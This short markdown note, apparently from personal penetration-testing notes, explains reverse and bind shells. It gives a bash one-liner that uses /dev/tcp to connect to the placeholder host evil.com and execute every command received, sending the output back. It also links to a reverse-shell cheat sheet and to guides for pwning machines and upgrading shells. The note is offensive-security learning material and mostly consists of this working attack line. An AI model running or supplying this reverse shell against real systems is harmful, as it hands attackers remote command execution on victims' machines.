# Reverse and Bind shells

It's possible to execute remotely command creating a shell that
connects back to home, like this below in ``bash``

```
exec 5<>/dev/tcp/evil.com/<same unfiltered port> $ cat <&5 | while read line; do $line 2>&5 >&5; done
```

## Links

 - [Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 - https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/
 - [Obtain PTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
